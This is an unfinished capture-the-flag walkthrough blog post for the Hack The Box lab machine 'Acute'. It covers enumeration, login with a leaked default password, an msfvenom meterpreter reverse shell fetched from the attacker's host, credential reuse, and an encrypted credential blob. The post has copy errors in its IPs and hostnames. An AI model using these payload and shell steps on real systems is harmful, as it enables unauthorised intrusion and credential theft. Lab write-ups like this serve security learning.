@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Acute -- HTB walkthrough ::
+        Werz — CyberSecurity
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Acute HTB | 0xwerz | 03/06/22 #  The official box page on HTB #  The writeup: #  System Scan | IP: 110.10.11.145 #  as usual let&amp;rsquo;s add the ip to to the /etc/hosts file and name it acute.htb
+ echo &#39;10.10.11.145 undetected.htb &#39; &amp;gt;&amp;gt; /etc/hosts
+ startup a nmap scan | -sC for the default set of scripts. | -sV for Enables version detection. | -T4 for sending the traffic fast."
+/>
+<meta
+  name="keywords"
+  content="ctf, hackthebox, writeup, htb writeup, walkthrough, retired htb, hack the box, cybersecurtiy, capture the flag"
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://0xwerz.github.io/12/02/2022/acute/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://0xwerz.github.io/assets/style.css" />
+
+<link rel="stylesheet" href="https://0xwerz.github.io/style.css" />
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+
+
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Acute -- HTB walkthrough"/>
+<meta name="twitter:description" content="https://app.hackthebox.com/machines/acute"/>
+
+
+
+<meta property="og:title" content="Acute -- HTB walkthrough" />
+<meta property="og:description" content="https://app.hackthebox.com/machines/acute" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xwerz.github.io/12/02/2022/acute/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-02-12T10:12:12+13:00" />
+<meta property="article:modified_time" content="2022-02-12T10:12:12+13:00" /><meta property="og:site_name" content="Werz" />
+
+
+
+
+
+
+  </head>
+  <body class="light-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="https://0xwerz.github.io/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >werz@blog:~$</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/archive">./archive</a></li>
+        
+      
+        
+          <li><a href="/posts">./articles</a></li>
+        
+      
+        
+          <li><a href="/about">./whoami</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/archive">./archive</a></li>
+      
+    
+      
+        <li><a href="/posts">./articles</a></li>
+      
+    
+      
+        <li><a href="/about">./whoami</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Acute &ndash; HTB walkthrough</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2022-02-12
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+        <span class="post-read-time"
+          >— 5 min read</span
+        >
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://0xwerz.github.io/tags/htb/">#htb</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/windows/">#windows</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/insane/">#insane</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/retired/">#retired</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="acute-htb--0xwerz--030622">
+  Acute HTB | 0xwerz | 03/06/22
+  <a href="#acute-htb--0xwerz--030622" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+The official <h3 id="the-official-box-pagehttpsapphacktheboxcommachinesundetected-on-htb">
+  <a href="https://app.hackthebox.com/machines/Undetected" target="_blank">box page</a>
+ on HTB
+  <a href="#the-official-box-pagehttpsapphacktheboxcommachinesundetected-on-htb" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/acute/img/Acute.png" style="border-radius: 3%;" alt="">
+<h3 id="the-writeup">
+  The writeup:
+  <a href="#the-writeup" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="system-scan--ip-1101011145">
+  System Scan | <strong>IP: 110.10.11.145</strong>
+  <a href="#system-scan--ip-1101011145" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>as usual let&rsquo;s add the ip to to the <code>/etc/hosts</code> file and name it <code>acute.htb</code></p>
+<blockquote>
+<p><code>echo '10.10.11.145    undetected.htb ' &gt;&gt; /etc/hosts</code></p>
+</blockquote>
+<p>startup a nmap scan | <strong>-sC for the default set of scripts</strong>. | <strong>-sV for Enables version detection</strong>. | <strong>-T4 for sending the traffic fast</strong>.</p>
+<blockquote>
+<p><code>nmap -sC -sV -T4 10.10.11.145</code></p>
+</blockquote>
+<pre tabindex="0"><code>werz@ctf01:~/ctf/htb/acute$ nmap -sC -sV -T4 10.10.11.145 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-03 01:58 CET
+Nmap scan report for acute.htb (10.10.11.145)
+Host is up (0.28s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| ssl-cert: Subject: commonName=atsserver.acute.local
+| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
+| Not valid before: 2022-01-06T06:34:58
+|_Not valid after:  2030-01-04T06:34:58
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: 2022-07-21T00:58:43+00:00; -1s from scanner time.
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 44.73 seconds
+</code></pre><h2 id="open-ports">
+  Open Ports
+  <a href="#open-ports" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>Ports</th>
+<th>Service</th>
+<th>Takeaways</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>443</td>
+<td>ssl/http</td>
+<td>Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</td>
+</tr>
+</tbody>
+</table>
+<p>So with have a single http/ssl port open and visiting <code>https://10.10.11.145</code> returns 404 that strange, there is a certificate with the name <code>atsserver.acute.local</code>. I’ll add that to the <code>/etc/hosts</code> file:</p>
+<blockquote>
+<p>echo 10.10.11.145     atsserver.acute.local</p>
+</blockquote>
+<p>so we got a hit back on <code>https://atsserver.acute.local/</code></p>
+<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/acute/img/webpage.png" style="border-radius: 3%;" alt="">
+<h3 id="web-page-enumeration">
+  Web page enumeration
+  <a href="#web-page-enumeration" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The about page may have some useful usernames under the <code>who we work with</code> headline.</p>
+<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/acute/img/who_we_work_with.png" style="border-radius: 3%;" alt="">
+<p>save them on a file list we may need them:</p>
+<pre tabindex="0"><code>Awallace
+Chall
+Edavies
+Imonks
+Jmorgan
+Lhopkins
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;Awallace\nChall\nEdavies\nImonks\nJmorgan\nLhopkins&#34;</span> &gt; users.enum
+</code></pre></div><p>we also have a doc file:
+<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/acute/img/docx.png" style="border-radius: 3%;" alt=""></p>
+<p>let&rsquo;s take a look
+,there is a bunch of information.</p>
+<ul>
+<li>
+<p>two links for staff inducation pages both returns 404</p>
+</li>
+<li>
+<p>there is a interesting section <code>IT overview</code> that gives a default password <code>Password1!</code>, and even mentions that some staff are not changing it:</p>
+<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/acute/img/default_pwd.png" style="border-radius: 3%;" alt="">
+</li>
+</ul>
+<p>we also have a windows PowerShell Web Access (PWSA) in the <code>Induction meetings with management staff</code> section:</p>
+<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/acute/img/pwsa.png" style="border-radius: 3%;" alt="">
+<p>that goes to <code>https://atsserver.acute.local/Acute_Staff_Access</code></p>
+<p>if we check the metadata for the doc file we catch up in the description a hostname <code>Acute-PC01</code> that may be created in and the creator name <code>FCastle</code> and last the modified by <code>Daniel</code></p>
+<p>let&rsquo;s give all these information we got a try to login on that web powershell.</p>
+<p>After some blind trys we got a valind request:
+<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/acute/img/pwsa_valid_login.png" style="border-radius: 3%;" alt=""></p>
+<p>and we are in as edavies!</p>
+<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/acute/img/pshell.png" style="border-radius: 3%;" alt="">
+<p>this web console is a bit of pain,<code>winpeas</code> is messed up, I&rsquo;ll generate a meterpreter shell</p>
+<h3 id="generaing-meterpreter-payload">
+  Generaing meterpreter payload
+  <a href="#generaing-meterpreter-payload" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/acute$ msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span> LHOST<span style="color:#f92672">=</span>10.10.14.141 -f exe -o shell.exe
+</code></pre></div><p>We need the metasploit console, also the options configuration:</p>
+<p>for running metasploit console use:</p>
+<blockquote>
+<p>msfconsole</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/multi/handler
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload generic/shell_reverse_tcp
+msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set payload windows/meterpreter/reverse_tcp
+payload <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp
+msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">9001</span>
+LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">9001</span>
+msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LHOST tun0
+LHOST <span style="color:#f92672">=</span>&gt; 10.10.14.141
+msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
+</code></pre></div><h3 id="uploading-the-reverse-shell">
+  Uploading the reverse shell
+  <a href="#uploading-the-reverse-shell" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>I&rsquo;ll setup a python webserver:</p>
+<blockquote>
+<p>python3 -m http.server 8080</p>
+</blockquote>
+<p>we have no access to write for most of the directories, but we can in <code>C:\Utils&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Utils&gt; wget 10.10.14.141<span style="color:#960050;background-color:#1e0010">:</span>8080/shell.exe -outfile rev.exe
+</code></pre></div><p>Now we should run the meterpreter listener, after that execute the exe file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.141:9001
+</code></pre></div><p>web powershel console:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Utils&gt; .\rev.exe
+</code></pre></div><p>and we got a hit back:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">200774</span> bytes<span style="color:#f92672">)</span> to 10.10.11.145
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.141:9001 -&gt; 10.10.11.145:49857<span style="color:#f92672">)</span> at 2022-07-24 17:39:49 +0000
+
+meterpreter &gt;
+</code></pre></div><p>type shell to switch.</p>
+<blockquote>
+<p>meterpreter &gt; shell</p>
+</blockquote>
+<h3 id="imonk-on-atsserver">
+  imonk on ATSSERVER
+  <a href="#imonk-on-atsserver" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Utils&gt; ipconfig
+windows IP Configuration
+
+Ethernet adapter Ethernet 2<span style="color:#960050;background-color:#1e0010">:</span>
+    Connection-specific DNS suffix  . <span style="color:#960050;background-color:#1e0010">:</span>
+    Link-local IPv6 Address . . . . . <span style="color:#960050;background-color:#1e0010">:</span> fe80::9513<span style="color:#960050;background-color:#1e0010">:</span>4361<span style="color:#960050;background-color:#1e0010">:</span>23ec<span style="color:#960050;background-color:#1e0010">:</span>64fd<span style="color:#66d9ef">%</span>14
+    Subnet Mask . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 255.255.255.0
+    <span style="color:#66d9ef">Default</span> Gateway . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 172.16.22.1
+    . .
+</code></pre></div><p>The gateway is likely the host.</p>
+<p>After a bit of manual enumeration I didn&rsquo;t reach anything, it&rsquo;s time for <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank">Winpeas</a>
+
+while running it I noticed a RDP session active.</p>
+<p>well, meterpreter have a active <strong>screenshare</strong> options I&rsquo;ll give it a try.
+you&rsquo;ll see a the desktop front for a while, after that a Powershell terminal opens as edavies following to create a credential object, and uses it to connect to the atsserver machine as the imonks user with the password leaked:
+<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/acute/img/pwd_leak_screen.png" style="border-radius: 3%;" alt=""></p>
+<p>I’ll create a credential object also:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Utils&gt; $pass = ConvertTo-securestring <span style="color:#e6db74">&#34;W3_4R3th3_f0rce.&#34;</span> -AsPlainText -Force
+PS C:\Utils&gt; $cred = New-object System.Management.Automation.PScredential(<span style="color:#e6db74">&#34;ACUTE\imonks&#34;</span>, $pass)
+</code></pre></div><p>if i try to spawn a PSsesion it rejects it (access denied)</p>
+<p>It’s possible that imonks is only allowed to connect with the <code>dc_manage</code> config that shows in the image . Specifying that gives a different error message (The term &lsquo;Measure-Object&rsquo; is not recognized as the name of cmdlet)
+I assume that it fails because the user imonks doesn&rsquo;t have access to the <code>Measure-Object</code> cmdlet. This could be an issue with the <code>dc_manage</code> conf</p>
+<p>we can use the <code>Invoke-Command</code> this should work</p>
+<p>and yes! it is</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Utils&gt; Invoke-Command -ScriptBlock {whoami} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+acute\imonks
+</code></pre></div><p>we can get the user flag now</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Utils&gt; Invoke-Command -ScriptBlock { cat C:\users\imonks\desktop\user.txt } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+</code></pre></div><p>we also can see a file beside the flag file on imonks desktop <code>vm.ps1</code> that look suspicious:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Utils&gt; Invoke-Command -ScriptBlock { ls C:\users\imonks\desktop} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\imonks\desktop
+ Mode               LastWriteTime       Length Name
+ ----               -------------       ------ ----             
+ -ar---     05/06/2022      22<span style="color:#960050;background-color:#1e0010">:</span>16           34 user.txt
+ -a----     11/01/2022      18<span style="color:#960050;background-color:#1e0010">:</span>04          602 wm.ps1
+</code></pre></div><p>it got creds for jmorgan on Acute-PC01:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$securepasswd = <span style="color:#e6db74">&#39;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#39;</span>
+$passwd = $securepasswd | ConvertTo-SecureString
+$creds = New-Object System.Management.Automation.PSCredential (<span style="color:#e6db74">&#34;acute\jmorgan&#34;</span>, $passwd)
+Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
+</code></pre></div><p>to be continued&hellip;</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://0xwerz.github.io/19/02/2022/undetected/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Undetected -- HTB walkthrough</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://0xwerz.github.io/08/01/2022/pandora/">
+                  <span class="button__text">Pandora -- HTB walkthrough</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">© 2022 Powered by Hugo</div>
+      
+  </div>
+</footer>
+
+<script src="https://0xwerz.github.io/assets/main.js"></script>
+<script src="https://0xwerz.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
